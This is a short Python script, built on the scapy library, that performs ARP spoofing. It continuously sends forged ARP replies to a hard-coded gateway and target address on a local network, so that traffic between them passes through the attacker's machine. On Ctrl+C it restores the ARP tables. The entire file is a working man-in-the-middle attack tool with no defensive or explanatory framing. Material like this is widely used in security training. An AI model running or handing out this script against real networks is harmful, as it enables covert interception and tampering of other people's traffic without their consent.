#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_request = broadcast / request
    answered_list = scapy.srp(broadcast_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)


gateway = "192.168.43.1"
target = "192.168.43.241"
try:
    packet_count = 0
    while True:
        spoof(gateway, target)
        spoof(target, gateway)
        packet_count = packet_count + 2
        print ("\rSent packet " + str(packet_count)),
        time.sleep(2)
except IndexError:
    print ("")
except KeyboardInterrupt:
    print ("\n[-] Ctrl + C detected ... Resetting ARP Tables ... Please Wait")
    restore(target, gateway)
    restore(gateway, target)
    print("[+]ARP Tables successfully restored")
